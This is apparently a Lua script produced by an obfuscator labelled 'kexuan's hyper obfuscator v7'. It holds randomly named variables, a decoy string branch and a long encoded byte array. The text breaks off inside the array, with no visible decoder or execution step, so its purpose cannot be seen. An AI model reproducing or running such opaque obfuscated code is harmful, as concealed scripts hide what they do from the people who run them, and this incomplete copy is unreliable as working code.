--[[
  /\ /\___ __  ___  /\ \ 
 / //_/ _ \\ \/ / / / | |
/ __ \  __/>  < / /___| |
\/  \/\___/_/\_\\____/|_|
  kexuan's hyper obfuscator v7
]]
local _HOfjVOhSNdlR=false
local _JYsILbBMPWIT
if _HOfjVOhSNdlR then _JYsILbBMPWIT=string.char(150,200) .. string.char(45,196,247) .. string.char(17,38,238,222,239) .. string.char(72,178) .. string.char(85,123,205) .. string.char(103,81) .. string.char(187,175,18,103,127) .. string.char(6,96,84,230) .. string.char(22,17,255,69) .. string.char(106,253) .. string.char(220,93,188)
else _JYsILbBMPWIT=string.char(253,251,173,18) .. string.char(85,63,89) .. string.char(106,208) .. string.char(235,194,10) .. string.char(47,245) .. string.char(146,29,6,173,180) .. string.char(28,137,197) .. string.char(102,194,129,116) .. string.char(229,254,176,104,116) .. string.char(15,237,145,131) end
local _RWpnBWVbRYiA=nil
local _yyTCQfdByPUh={137,56,113,157,148,112,180,183,226,200,218,199,96,45,224,115,99,39,246,31,214,87,209,4,52,100,6,59,105,47,82,6,40,28,115,218,248,142,52,54,132,181,120,103,123,201,100,178,218,10,21,159,86,224,111,142,42,240,74,233,72,243,106,11,212,192,253,157,149,197,0,182,237,202,16,228,143,66,223,174,77,14,90,48,41,200,58,222,156,165,1,245,138,107,130,14,131,137,48,134,196,17,156,162,46,23,180,117,208,91,55,209,202,123,106,168,123,60,142,150,84,42,3,181,180,166,128,151,24,100,22,78,176,67,143,210,163,253,215,100,220,240,188,202,7,152,115,189,72,127,171,242,162,182,6,60,48,138,251,171,202,88,231,94,238,217,153,9,11,104,19,111,255,162,159,95,181,216,73,140,26,189,202,163,37,250,71,10,123,223,185,80,156,252,109,214,201,129,0,153,152,83,145,52,10,60,44,39,218,47,88,4,195,128,131,215,248,153,81,178,72,69,141,116,179,202,11,232,109,175,3,196,35,141,149,186,134,214,50,184,252,150,151,153,141,26,236,31,241,171,239,196,143,175,254,17,214,115,147,225,167,142,189,114,73,52,102,87,134,11,43,88,166,150,46,113,220,125,68,146,26,212,57,92,17,119,216,66,128,99,49,154,251,25,112,164,223,166,191,55,31,60,96,197,118,29,191,110,144,193,65,133,18,45,231,77,136,59,200,44,77,117,3,35,149,100,231,153,190,177,214,171,94,134,189,229,173,244,19,126,228,106,118,148,208,194,29,111,239,213,11,203,181,74,253,135,185,163,27,140,186,169,72,96,149,35,0,95,1,114,34,39,92,137,127,189,222,208,213,49,9,142,9,76,113,226,130,180,251,212,235,89,143,240,167,100,55,122,4,140,8,132,253,67,105,209,124,127,164,72,103,122,169,50,189,82,67,179,206,153,179,135,66,128,121,99,221,21,235,155,35,58,140,154,255,212,31,155,246,231,197,136,220,9,61,198,220,176,104,107,72,201,223,172,74,73,244,127,227,135,170,5,188,210,35,57,192,192,236,230,82,4,91,92,176,197,45,35,103,226,80,217,153,111,195,214,97,150,80,241,127,121,119,227,112,182,230,249,142,71,95,115,149,224,73,202,234,234,111,183,211,52,164,226,118,62,127,212,73,187,74,12,38,34,51,142,133,62,198,24,114,106,206,7,77,7,11,84,53,169,235,188,122,216,24,18,23,75,195,250,115,255,110,148,97,251,108,146,37,98,157,123,26,225,211,111,254,203,170,236,255,63,85,84,45,37,130,20,39,220,154,31,30,195,74,99,200,57,34,245,87,240,198,27,236,233,33,115,199,247,172,104,225,23,209,96,165,133,163,214,193,204,123,234,208,123,105,39,235,28,147,125,20,217,159,7,130,11,54,231,142,67,66,70,209,42,0,18,163,73,80,47,45,141,34,153,168,132,174,202,205,247,35,149,171,91,88,1,3,163,46,249,62,45,2,117,244,62,101,215,164,153,98,5,104,116,121,10,103,209,144,191,225,255,157,24,245,214,191,197,13,243,128,121,99,119,26,200,154,118,207,43,38,48,139,11,218,176,76,44,196,112,53,55,66,0,179,185,4,7,90,112,58,87,46,172,33,136,233,84,87,243,18,48,10,52,48,200,150,159,170,116,180,19,193,209,146,156,205,187,172,222,212,82,144,36,42,75,29,187,48,4,220,143,118,253,74,239,240,156,15,161,104,154,59,149,222,164,81,235,161,42,227,133,202,238,92,239,217,238,105,24,166,122,253,113,131,111,145,213,244,39,255,239,6,36,235,70,168,87,252,175,73,17,173,207,15,110,185,156,234,51,136,123,88,63,24,22,39,96,182,228,133,175,167,133,237,47,207,151,192,226,44,155,85,187,10,4,156,155,47,40,17,175,121,197,16,170,37,217,99,225,163,97,77,134,199,35,139,22,247,155,122,65,118,79,181,198,63,58,199,111,161,160,62,239,127,237,52,163,62,211,239,187,215,178,211,196,243,180,20,45,62,126,86,15,96,200,255,166,13,86,27,182,72,249,117,77,227,216,65,16,89,25,66,38,82,19,201,179,177,65,8,193,70,34,137,193,23,156,90,95,108,211,129,108,240,8,76,222,143,39,34,133,197,143,101,164,124,114,197,121,221,250,67,109,167,247,163,233,223,218,235,16,17,59,130,196,134,207,167,183,39,130,39,255,202,163,21,166,181,184,195,146,13,143,218,240,197,141,158,60,66,11,31,168,90,143,196,49,72,140,194,110,129,254,87,137,171,197,112,121,88,172,24,6,116,93,38,5,219,26,75,202,167,241,106,96,242,116,114,236,1,83,155,246,179,162,96,110,121,201,177,196,62,192,86,206,76,42,166,190,161,216,37,152,124,29,98,42,172,92,222,120,13,168,62,89,173,142,178,70,21,99,157,1,208,151,34,206,181,254,83,69,46,218,54,31,112,50,210,62,226,167,151,99,107,145,140,37,53,40,123,79,32,166,213,226,160,128,195,135,50,22,144,83,175,50,194,161,79,108,169,49,208,131,182,61,112,225,41,32,30,143,183,47,221,139,13,213,64,32,227,47,173,11,40,250,145,75,70,26,3,194,131,75,63,209,35,49,149,92,93,50,131,96,206,0,216,137,220,57,169,190,85,123,182,225,114,250,200,134,9,178,80,254,120,32,27,211,148,23,235,107,79,98,215,67,150,208,209,240,220,49,155,224,168,7,75,234,249,44,107,210,183,203,88,90,97,172,186,158,114,229,171,147,44,174,57,98,35,55,253,67,47,193,73,176,201,56,125,112,86,48,178,3,141,105,233,128,93,199,11,67,215,30,239,143,75,251,175,78,215,68,175,80,69,95,128,149,218,180,177,247,56,32,127,68,22,149,160,207,104,200,114,27,237,78,119,125,151,176,53,174,181,95,200,9,43,9,218,135,27,107,108,0,183,134,108,186,191,89,88,253,61,146,161,54,106,14,209,29,183,238,238,196,229,19,251,55,43,196,132,194,95,222,135,29,131,18,204,168,213,87,118,207,202,0,191,214,171,228,240,112,96,47,249,45,221,136,60,253,148,192,245,64,229,69,184,50,19,149,89,243,136,34,106,202,107,77,182,10,147,34,70,38,113,55,152,135,181,73,246,45,22,235,33,34,96,156,45,7,230,24,202,108,41,161,245,154,154,242,227,162,201,71,151,59,58,17,184,80,190,174,114,92,119,105,167,5,28,67,118,225,18,249,178,171,20,15,199,158,104,96,61,194,96,132,187,233,134,58,97,187,23,199,166,113,97,30,138,255,80,41,195,127,43,64,9,54,160,84,221,70,160,221,11,194,139,116,95,147,152,107,194,147,94,126,10,148,97,32,250,122,59,181,105,36,9,113,97,72,139,90,231,125,111,176,23,165,84,197,62,50,67,35,231,79,217,131,119,62,115,197,169,211,116,241,154,128,132,101,75,60,20,168,71,82,184,235,185,174,156,110,13,79,37,209,182,23,198,223,89,171,75,9,111,254,208,165,214,123,194,136,145,80,236,138,22,249,56,12,90,11,19,116,172,188,3,41,249,123,76,219,190,24,233,10,206,126,106,220,211,191,143,84,76,29,142,48,15,15,230,31,248,77,21,231,250,169,4,50,130,239,40,142,200,84,144,110,1,41,35,217,168,48,22,202,72,140,110,128,159,118,74,99,119,109,226,81,223,17,206,252,184,135,177,63,17,188,140,185,201,49,206,208,240,17,177,32,177,157,39,235,66,19,11,139,0,208,120,23,209,97,123,201,35,129,244,176,64,21,65,127,82,76,54,118,112,9,166,168,177,7,226,193,167,121,213,218,131,59,76,117,243,98,165,209,69,234,164,190,211,194,0,243,76,43,57,161,148,18,242,193,119,37,77,83,185,27,48,132,173,80,156,226,17,255,159,168,102,162,167,117,154,218,197,5,35,124,214,74,161,134,216,137,65,205,139,173,186,145,166,248,147,39,19,229,36,241,113,80,152,252,75,46,91,217,185,27,206,157,91,204,50,150,55,159,78,60,119,161,195,136,102,211,231,27,116,140,102,177,211,99,148,180,216,209,205,12,200,107,67,106,137,104,43,119,180,186,224,151,158,70,70,224,138,28,118,130,44,249,247,30,174,189,174,47,158,254,40,63,254,131,115,144,252,41,52,49,107,224,245,103,22,35,155,216,244,248,6,126,191,217,194,193,38,145,146,7,161,189,55,241,64,198,176,247,2,11,192,1,248,214,103,12,240,118,223,64,193,55,50,160,121,66,219,169,246,120,7,221,153,193,144,39,134,235,169,134,10,94,251,76,234,120,190,153,79,130,172,41,178,133,184,171,251,82,248,210,237,123,44,46,180,146,246,60,18,140,7,188,89,26,254,77,91,84,133,124,85,10,31,153,70,60,125,49,122,172,126,60,92,77,142,1,8,22,78,198,140,128,103,163,67,20,91,67,70,161,42,132,41,157,84,73,62,222,173,185,170,56,172,60,92,146,23,31,109,196,170,39,149,59,153,177,83,250,206,74,200,170,82,191,238,204,52,25,209,86,208,131,250,140,5,239,242,226,116,229,200,255,227,149,34,254,160,162,233,172,249,234,247,74,221,18,68,177,240,165,150,119,119,141,144,186,80,19,234,181,168,18,99,179,205,34,227,63,37,218,61,172,242,170,223,112,229,208,58,134,31,37,187,11,211,247,39,179,212,86,36,129,206,121,169,194,192,216,193,187,176,235,78,218,126,114,140,207,78,173,36,70,116,40,233,145,193,38,59,149,11,203,226,106,23,162,229,107,200,161,231,138,132,163,134,150,144,237,105,158,126,79,245,151,44,179,199,41,13,227,184,59,130,166,190,126,23,30,19,222,0,57,90,192,134,116,121,85,236,33,47,89,85,87,146,114,102,20,210,181,121,211,176,225,28,25,15,0,37,178,73,32,207,114,227,239,142,181,96,229,93,40,9,61,68,45,139,93,197,200,99,160,73,85,165,252,39,78,158,45,94,53,92,253,114,148,54,172,168,42,241,46,123,74,199,23,164,237,213,102,171,250,152,246,32,117,65,207,176,34,251,95,237,66,32,224,76,241,116,254,111,190,115,139,183,28,54,178,92,34,215,144,203,34,213,90,17,208,90,92,164,131,202,93,251,114,102,240,20,151,27,56,127,171,6,36,94,140,131,51,100,246,93,211,70,238,52,199,45,140,188,109,247,237,174,86,226,193,236,172,66,222,79,71,4,185,137,152,193,244,127,88,152,57,95,255,185,203,165,210,126,169,133,35,80,219,165,28,147,221,93,120,137,251,156,47,131,47,56,150,5,2,43,115,236,53,33,59,43,14,93,151,108,54,184,49,176,176,130,210,19,114,21,213,97,70,21,218,38,242,31,81,220,114,75,103,166,4,108,177,211,90,251,245,234,200,252,172,57,92,230,141,195,35,71,156,51,135,243,63,21,107,213,57,216,231,32,177,28,32,167,250,253,158,251,50,229,150,157,239,174,250,10,246,148,193,49,78,168,172,179,135,149,74,107,155,207,119,237,72,206,183,122,151,85,123,91,6,244,242,116,239,165,239,125,124,184,185,99,178,239,151,229,82,178,110,253,210,95,109,82,153,5,184,114,77,242,219,187,166,216,241,225,80,243,104,16,223,224,169,48,122,138,142,76,150,249,192,9,98,148,230,238,31,246,93,206,242,196,236,167,197,210,166,184,241,228,197,169,47,121,122,107,130,46,179,57,84,225,65,141,56,243,241,122,48,167,82,9,47,188,228,193,222,144,201,113,238,236,133,30,35,216,175,54,3,88,76,15,251,232,84,5,75,245,185,218,131,222,208,170,69,56,119,242,167,174,239,116,93,241,33,227,177,234,25,14,48,204,217,59,55,9,193,33,3,180,55,128,76,94,131,193,78,82,157,205,4,62,120,255,147,147,221,147,98,228,188,217,1,17,111,24,119,109,248,14,183,16,159,129,31,34,199,69,28,213,33,175,156,30,182,243,205,157,117,114,92,104,38,231,14,188,183,219,98,60,4,184,27,116,23,75,92,75,216,4,89,71,2,147,49,224,50,41,144,86,219,66,120,6,225,113,162,138,19,90,136,167,244,134,247,203,247,208,202,52,82,129,12,179,161,165,126,101,29,63,134,110,245,34,29,71,174,112,98,57,233,209,245,33,107,133,166,59,43,229,182,105,235,225,0,191,6,187,220,25,16,128,129,243,163,178,214,152,57,194,36,203,94,47,145,232,174,71,158,70,116,162,103,37,248,200,30,97,90,164,152,49,58,52,53,138,248,38,139,80,138,250,170,72,200,50,154,49,213,35,111,184,153,7,159,164,24,107,32,219,105,148,139,168,167,24,120,83,132,221,134,42,75,217,75,98,160,50,49,194,17,110,22,229,76,137,125,87,82,202,49,45,172,90,197,218,177,75,199,207,203,190,211,236,126,195,117,46,30,116,5,45,21,187,131,94,230,12,107,253,142,211,181,83,203,181,143,26,176,26,195,59,132,100,174,208,120,70,184,240,185,57,22,42,11,162,130,128,121,65,178,231,75,24,126,39,163,105,242,85,187,136,31,48,136,223,74,61,206,46,45,4,123,31,13,74,7,76,195,177,121,198,44,234,208,3,87,161,110,147,238,121,198,25,16,117,29,17,249,88,112,255,64,71,184,39,24,63,42,13,253,196,82,209,66,131,172,58,11,120,148,163,53,59,211,72,33,226,66,171,198,124,223,24,61,135,181,164,97,126,194,233,61,11,113,100,96,177,225,47,206,11,83,200,3,57,121,143,252,72,219,3,14,46,198,40,31,113,96,38,200,72,35,182,241,19,38,240,148,190,135,193,189,59,156,102,33,65,62,48,212,252,3,170,154,155,47,177,36,130,195,163,169,90,17,221,139,164,248,239,81,88,27,17,73,76,82,198,124,133,189,118,91,156,94,252,200,107,145,34,203,184,4,143,246,89,132,249,210,72,94,170,207,109,171,15,171,46,181,228,3,207,154,84,168,103,15,193,167,193,55,49,166,98,234,162,127,110,254,185,212,6,255,151,157,52,243,75,39,160,180,186,112,104,169,7,142,114,63,243,191,115,43,225,86,117,215,177,196,239,50,150,84,51,58,151,39,26,135,196,246,147,79,236,148,60,253,77,54,183,185,214,40,125,212,51,93,108,90,20,146,206,211,83,157,120,131,193,173,94,254,55,150,87,56,157,184,86,208,146,205,194,237,108,123,85,176,72,139,242,27,100,85,40,32,128,92,33,181,116,48,241,41,45,249,94,182,58,121,1,40,77,221,105,53,176,27,251,61,68,91,220,60,73,182,65,228,39,31,139,251,39,66,136,210,89,115,17,94,191,180,40,85,24,63,19,145,150,130,174,236,58,213,83,135,170,245,217,133,39,174,215,164,90,119,130,33,151,153,188,192,231,89,59,127,138,168,134,77,177,125,61,28,193,177,43,11,189,61,215,179,116,99,85,6,202,5,142,61,218,86,4,75,44,11,241,181,143,45,122,232,20,108,128,44,94,35,166,73,118,145,198,218,152,144,117,55,88,11,128,104,91,78,16,68,232,140,2,79,246,151,4,237,174,115,36,119,90,189,142,11,66,254,136,127,214,60,117,26,68,235,137,184,36,155,85,60,239,39,248,235,53,186,133,135,56,241,254,100,100,215,92,209,195,71,172,80,154,80,145,125,203,223,74,133,66,88,101,1,145,116,198,123,251,127,117,33,176,168,31,90,245,35,103,248,253,20,49,38,110,86,145,241,38,192,2,246,200,193,37,139,119,140,44,223,206,204,122,233,111,26,219,244,144,220,219,125,20,99,124,96,62,152,103,216,122,201,241,119,173,69,147,18,67,51,60,216,19,150,51,22,228,155,134,140,151,25,247,159,49,250,40,62,189,144,63,143,203,235,94,89,84,22,139,48,120,208,235,47,6,183,113,110,148,22,203,83,17,93,240,207,247,92,164,168,217,60,118,113,128,165,242,50,95,201,45,15,15,237,192,149,4,134,141,135,116,123,149,252,100,43,195,119,217,213,7,234,12,213,87,230,201,175,86,62,2,227,255,215,18,186,197,153,135,100,62,249,116,50,8,237,164,27,46,150,195,31,255,67,113,79,37,44,26,226,6,222,150,247,130,196,179,114,110,75,175,201,29,236,214,13,170,175,187,70,183,7,135,30,153,213,194,168,151,228,157,17,191,18,109,23,155,131,149,46,246,116,6,57,69,10,149,208,71,83,109,4,208,0,190,217,47,63,203,70,55,160,105,215,224,70,35,153,168,136,183,124,246,24,134,36,28,48,57,191,65,6,222,23,253,134,25,114,130,101,66,62,243,177,30,5,67,238,92,243,80,205,149,13,65,123,68,82,28,105,70,94,52,180,27,116,20,94,75,67,174,29,104,118,63,195,167,31,56,125,158,36,64,86,154,207,69,165,10,202,120,186,206,223,166,206,56,77,223,96,205,53,50,202,161,65,110,61,180,53,53,183,253,168,157,215,196,136,110,245,58,132,20,51,26,239,69,120,146,67,148,224,76,172,80,14,176,199,143,100,137,76,135,175,166,59,144,251,75,202,103,32,158,61,122,96,170,74,1,225,226,181,90,173,62,39,170,205,168,242,87,137,63,159,233,152,228,160,5,231,143,169,242,246,146,243,9,241,32,198,215,188,24,9,99,241,234,180,101,63,206,92,159,62,84,23,70,110,159,127,147,167,203,139,172,207,105,145,245,41,177,109,164,226,81,112,184,228,11,234,192,19,154,60,92,6,246,218,43,234,17,51,209,146,211,13,125,234,37,6,206,169,54,4,5,208,255,42,199,235,213,41,239,63,213,165,96,192,33,54,111,132,187,63,166,44,109,141,30,222,241,245,16,97,192,17,120,154,153,82,64,226,74,74,195,135,212,182,120,209,82,25,44,205,170,174,17,174,222,77,205,8,18,199,245,166,177,63,227,170,80,144,15,204,216,83,12,134,66,133,255,172,56,43,153,148,111,19,66,214,19,240,166,175,156,213,59,136,182,238,1,242,100,75,127,140,134,37,108,66,49,240,66,214,25,205,105,127,194,74,70,73,197,222,28,124,100,21,233,23,177,5,87,145,151,210,212,71,101,175,236,32,152,60,56,193,236,166,90,179,169,172,161,157,142,245,194,61,114,8,241,53,165,211,240,84,21,216,157,249,162,197,144,163,8,76,192,35,190,213,177,119,149,37,19,206,252,139,227,90,99,170,209,171,249,91,178,106,181,56,110,30,97,117,204,202,148,2,230,11,177,179,104,144,204,189,106,54,85,44,132,70,30,51,243,11,243,11,89,221,157,204,55,236,226,42,130,148,74,235,138,178,70,137,144,21,12,229,225,16,76,223,81,91,127,136,28,193,236,184,169,83,14,169,158,196,216,235,73,177,187,133,83,141,8,213,35,67,67,142,248,96,232,225,85,249,135,212,245,210,145,125,158,234,188,3,171,199,171,35,201,33,212,122,151,203,171,28,53,133,189,155,177,174,204,56,246,40,56,30,123,236,75,82,11,95,32,25,228,12,76,239,249,46,161,64,115,96,111,234,240,123,243,81,166,58,210,167,124,54,10,152,167,154,4,190,124,95,247,251,127,36,24,33,132,71,65,182,48,6,62,210,162,72,97,220,219,229,142,39,98,155,100,226,129,56,136,170,168,61,255,117,130,97,146,20,242,231,144,20,30,247,191,189,5,7,169,82,225,165,224,136,58,31,12,78,25,27,211,150,172,239,123,82,36,95,33,59,238,6,71,203,83,81,74,77,176,137,10,227,115,62,156,124,43,107,64,152,47,78,182,190,25,202,115,0,238,50,4,115,81,158,103,3,174,131,113,189,185,112,29,92,129,10,243,233,101,151,246,67,175,210,181,150,240,141,6,11,250,38,116,45,76,116,57,208,195,215,26,220,114,85,80,105,172,93,18,20,216,32,105,225,149,30,168,183,109,46,75,34,231,78,211,173,164,23,190,227,107,37,120,209,242,172,75,39,109,197,251,96,131,218,82,15,58,252,25,87,134,128,22,71,174,8,200,14,206,180,109,163,132,16,182,42,49,194,66,122,95,167,90,48,114,127,159,147,87,40,134,20,26,79,101,149,163,159,229,46,117,117,253,203,85,46,172,103,60,211,127,53,100,49,55,162,24,100,91,200,156,84,144,53,159,209,238,117,173,192,31,11,37,41,110,240,160,250,198,150,119,251,254,85,229,227,126,6,10,16,59,80,62,100,57,211,100,138,24,33,217,84,194,0,116,110,3,236,40,205,129,174,151,244,49,115,184,233,10,33,249,163,245,176,205,206,250,123,145,16,38,202,70,43,225,63,71,103,194,103,13,145,134,104,197,146,119,113,14,164,181,173,196,221,27,172,139,117,63,29,55,67,67,35,23,135,34,140,177,65,20,84,226,98,26,128,130,75,86,177,228,146,38,97,63,152,188,66,41,30,199,134,132,145,26,178,2,12,31,19,238,6,46,72,109,139,29,168,161,150,227,189,224,211,125,59,187,39,164,213,166,195,227,13,61,155,111,30,245,56,191,109,9,227,101,239,59,115,251,138,9,129,166,240,235,145,130,99,215,203,29,185,189,118,20,70,60,24,142,14,161,202,250,153,62,244,121,135,94,221,18,82,109,18,203,140,234,71,237,150,152,235,96,170,95,188,37,246,162,20,27,232,220,201,95,75,245,19,155,227,86,187,30,35,60,248,175,114,38,46,231,51,236,103,96,177,82,96,238,115,100,171,5,175,135,109,86,222,163,82,76,18,249,99,69,249,117,73,103,203,31,221,97,105,110,33,123,8,193,250,240,62,201,78,189,75,105,38,19,244,85,112,237,51,172,69,218,184,202,69,188,27,6,17,100,19,220,223,17,58,222,173,241,49,175,143,29,46,86,211,203,225,227,8,128,203,122,75,222,177,233,21,161,56,44,95,89,73,61,32,201,250,128,191,136,183,80,254,18,42,237,188,45,90,173,145,89,254,223,152,73,245,78,160,171,122,175,16,68,110,71,197,224,125,251,65,66,170,34,21,84,33,151,249,27,10,104,4,57,189,255,38,15,93,61,157,85,92,134,185,151,167,128,90,173,196,166,196,241,200,204,27,7,190,88,127,22,189,116,228,149,56,34,137,87,203,169,143,150,70,16,123,228,21,254,79,151,227,254,118,38,1,252,96,75,139,201,84,20,58,180,193,79,34,103,23,120,224,125,175,17,131,90,4,225,239,118,8,137,173,87,219,34,67,187,253,118,154,210,247,116,24,111,167,55,32,110,3,204,197,98,34,200,98,227,229,53,126,194,250,235,139,157,111,158,98,21,99,60,187,115,31,10,79,193,138,85,64,165,217,141,165,56,182,212,38,195,93,155,231,237,37,152,239,123,130,74,60,144,143,164,55,35,231,185,62,10,145,178,91,183,37,42,182,214,83,153,167,81,252,38,33,116,170,60,157,96,60,46,27,49,247,163,6,1,245,98,75,221,44,28,57,225,58,54,6,137,92,181,160,99,66,235,130,36,249,205,99,9,251,47,87,212,204,36,199,31,218,79,93,140,191,227,235,204,249,170,252,214,74,123,204,230,125,203,44,220,80,128,121,129,145,25,22,133,117,128,212,165,61,172,251,221,207,240,206,70,10,235,41,80,107,198,146,220,37,149,85,57,5,50,216,188,161,16,7,120,251,191,54,67,129,132,26,235,71,179,131,229,16,131,197,113,233,40,145,58,187,102,108,203,144,148,67,35,209,220,162,57,0,192,129,25,180,106,59,45,25,113,218,69,231,156,192,145,222,35,129,221,149,41,218,152,79,35,128,94,119,191,31,175,209,36,146,111,109,73,58,205,107,255,181,135,62,160,145,239,31,245,104,29,206,57,51,47,77,16,100,50,47,217,216,252,153,171,76,22,97,15,101,237,23,168,72,214,192,204,196,221,21,117,70,24,96,28,39,16,43,105,198,197,102,192,192,227,166,21,137,81,171,4,134,98,26,153,169,193,239,64,69,0,36,134,155,119,76,183,109,67,41,103,45,145,125,207,101,129,184,134,139,255,19,39,230,226,39,217,141,23,201,3,249,240,219,32,86,85,147,211,191,104,89,131,221,45,140,7,115,230,49,168,117,189,54,28,188,93,66,0,181,137,92,196,127,222,185,14,80,91,242,58,92,216,170,26,99,212,13,56,197,253,146,127,100,213,103,179,250,107,205,38,103,25,106,55,187,143,206,211,62,87,33,175,14,14,98,5,152,114,157,87,49,254,110,139,237,62,205,200,4,66,143,13,170,124,157,188,198,54,228,255,90,64,175,148,99,6,112,75,61,114,183,204,79,123,58,92,111,254,76,62,219,33,168,91,192,53,46,253,170,136,88,154,243,8,127,50,228,140,97,58,127,109,212,14,128,35,127,136,27,81,251,248,235,143,75,75,0,103,105,57,95,177,163,156,25,61,195,9,167,0,65,53,203,120,231,39,138,112,108,134,135,118,123,202,111,112,118,90,7,81,189,140,162,69,196,15,80,168,95,31,234,199,140,40,178,13,229,9,226,11,99,102,209,206,250,210,25,175,238,73,230,234,92,80,232,222,92,111,201,99,9,75,110,9,163,9,37,136,129,13,136,186,166,197,160,176,15,53,12,2,46,153,21,144,97,139,209,82,103,96,176,160,103,70,137,203,62,158,206,3,7,122,224,64,238,1,184,234,122,201,65,141,162,101,137,123,126,173,171,232,135,121,128,54,127,24,139,125,181,139,219,126,62,3,213,203,101,223,70,195,26,123,92,74,227,87,161,22,248,232,49,201,141,164,99,92,128,194,183,72,1,248,117,117,6,123,230,103,158,183,123,215,89,130,31,26,159,232,252,37,232,85,116,149,97,184,28,78,10,137,174,8,3,56,202,129,181,65,52,229,115,175,178,86,54,23,81,136,16,230,97,53,205,95,25,142,102,184,63,0,200,162,89,170,137,96,133,224,55,111,105,46,43,171,195,158,208,42,59,88,13,213,139,65,80,115,8,12,85,37,232,68,195,80,162,53,227,164,15,72,15,208,177,40,42,188,92,89,181,233,199,37,245,129,44,166,211,175,213,87,57,8,75,125,84,57,130,249,9,129,124,240,60,24,162,45,87,141,67,192,214,179,2,136,70,225,58,95,124,200,98,65,188,143,232,214,182,233,61,162,150,235,115,135,193,115,139,132,95,84,222,224,149,16,208,28,13,58,65,110,91,176,214,32,133,59,74,199,66,96,158,161,98,4,235,118,62,78,2,16,204,252,17,1,84,175,252,167,106,217,153,51,168,102,165,245,6,149,217,12,71,183,86,164,118,101,201,42,139,136,60,182,52,35,137,183,246,189,212,88,178,153,196,25,8,252,41,54,199,245,244,54,236,57,167,43,139,38,172,146,91,67,41,225,239,68,11,73,249,141,137,13,230,191,243,190,100,222,117,88,169,44,180,176,176,78,114,108,141,212,119,36,97,63,43,28,246,31,244,209,252,97,158,68,55,186,19,218,10,65,197,193,68,155,35,127,66,229,153,250,231,161,59,146,151,126,72,73,50,160,109,45,84,123,77,115,30,48,134,5,152,102,129,145,216,7,107,72,215,82,148,203,120,239,106,44,80,222,120,74,248,1,27,0,206,65,184,11,255,189,22,102,91,210,137,254,151,65,92,39,39,177,157,109,44,177,229,60,232,48,157,181,121,232,117,102,185,8,106,153,211,64,50,135,56,125,1,204,145,35,252,216,227,18,72,91,19,93,167,43,17,32,46,199,192,130,169,245,56,132,148,246,251,223,61,115,78,207,78,91,184,16,41,85,119,107,122,189,202,141,142,18,225,219,186,143,31,117,163,197,128,16,20,16,13,189,162,54,31,76,17,8,237,238,21,64,24,45,177,220,97,232,35,65,57,246,120,49,95,17,65,151,129,189,122,38,100,195,175,12,17,11,240,208,198,142,239,61,121,247,129,34,128,154,241,90,133,210,75,101,181,2,233,74,23,91,156,82,224,63,104,112,130,146,150,167,83,64,195,215,91,52,116,81,208,173,46,139,22,212,41,43,54,131,81,12,169,106,184,234,152,151,241,249,35,112,89,176,141,11,25,145,238,178,19,170,27,87,24,193,241,82,120,90,12,111,174,109,175,160,21,44,165,73,55,42,7,97,110,253,100,55,59,190,93,210,100,222,196,58,107,165,11,120,97,169,209,50,142,193,242,254,107,97,184,199,50,249,100,43,215,111,121,190,30,208,178,133,123,220,249,49,59,83,45,159,119,241,64,108,17,58,136,194,158,58,227,144,222,15,134,78,94,81,185,3,249,93,28,7,127,101,163,254,254,35,195,236,94,145,127,112,101,236,78,46,71,76,202,42,179,114,13,180,251,111,234,236,186,115,203,81,73,128,14,254,81,143,215,230,14,62,102,62,96,76,99,123,247,131,229,253,129,71,201,22,2,238,111,61,197,144,247,97,1,233,95,44,29,235,144,48,85,224,160,159,253,193,71,145,196,96,165,238,168,13,64,89,163,150,167,174,34,128,216,131,138,75,79,48,107,165,116,138,20,244,47,14,26,186,4,226,197,1,229,86,109,239,60,164,25,4,47,104,227,96,179,99,166,182,20,142,2,217,123,33,42,24,165,49,141,76,175,68,28,174,245,173,107,22,51,252,225,10,98,193,231,255,175,44,25,103,229,8,154,197,249,24,64,211,189,105,218,205,145,145,246,128,136,97,24,229,190,117,197,18,44,241,144,53,186,118,137,61,132,57,27,45,162,228,195,214,49,125,252,178,68,241,181,126,84,59,143,234,100,254,235,162,2,45,228,206,180,23,18,144,31,250,57,162,179,110,246,253,139,152,203,247,85,183,43,250,213,68,64,127,210,189,165,102,128,0,130,187,178,163,55,171,34,208,184,54,169,16,79,164,73,70,208,206,26,41,220,10,119,244,83,211,57,142,50,26,36,78,247,72,175,91,62,197,232,143,24,22,254,255,103,133,210,53,211,170,234,149,14,142,65,253,188,179,76,104,74,199,81,156,205,221,176,53,73,198,139,64,43,251,186,104,54,55,150,222,143,88,217,112,107,0,230,47,59,25,154,225,90,61,119,142,58,246,42,241,88,164,253,20,73,94,237,234,163,197,47,2,186,102,101,122,236,194,70,238,48,58,141,106,111,156,56,236,155,91,68,187,176,77,7,118,151,179,154,160,79,87,237,203,88,185,243,156,132,212,102,101,166,33,141,215,225,104,43,114,217,225,124,50,16,123,103,203,112,147,226,32,70,158,129,131,59,20,101,137,167,229,24,249,119,159,228,255,168,250,94,94,65,219,93,24,137,176,87,18,34,102,152,153,152,110,250,163,136,183,203,115,186,60,199,21,142,43,197,55,91,195,140,37,69,148,50,9,81,131,94,99,255,189,119,73,16,70,21,231,27,160,213,234,11,160,195,127,50,150,148,184,61,161,21,23,245,142,202,132,149,46,179,180,201,55,220,137,239,114,196,127,242,40,162,199,217,229,180,146,202,172,156,11,128,127,178,6,223,172,221,19,160,214,53,2,73,205,59,42,154,120,253,153,150,23,222,245,237,21,60,83,235,146,237,187,170,240,44,127,219,155,53,112,140,251,113,85,22,123,8,12,18,200,195,168,145,8,205,95,91,233,55,31,145,244,45,105,48,97,172,39,204,49,165,66,105,201,39,176,105,189,61,91,104,4,178,200,30,144,35,137,23,85,58,132,125,0,227,173,24,60,174,57,181,141,230,187,246,175,48,38,255,143,95,86,34,184,87,233,19,186,101,149,6,156,27,199,3,185,177,155,183,186,167,42,161,123,218,9,137,255,181,178,189,9,180,112,177,207,20,11,139,186,235,217,249,34,175,130,133,1,238,82,76,80,179,217,27,205,94,105,84,222,246,149,82,232,15,126,145,68,232,88,113,32,91,242,96,70,161,210,8,114,162,225,115,15,100,41,53,88,190,194,97,48,133,85,18,233,156,61,250,222,242,151,168,235,110,166,62,111,235,145,123,114,98,169,234,55,15,132,253,114,140,60,25,165,203,176,113,217,173,176,72,125,235,177,24,222,102,163,40,9,157,187,181,168,24,69,249,202,60,232,65,79,74,154,81,62,190,189,34,205,215,87,76,248,253,194,153,23,120,70,110,218,9,138,13,30,23,134,239,215,162,56,158,15,175,36,65,173,125,192,213,226,180,235,115,10,95,236,210,96,213,177,49,40,69,154,60,151,142,219,99,112,33,180,105,164,237,104,67,146,21,121,113,160,1,122,78,235,184,226,83,207,117,97,89,172,57,249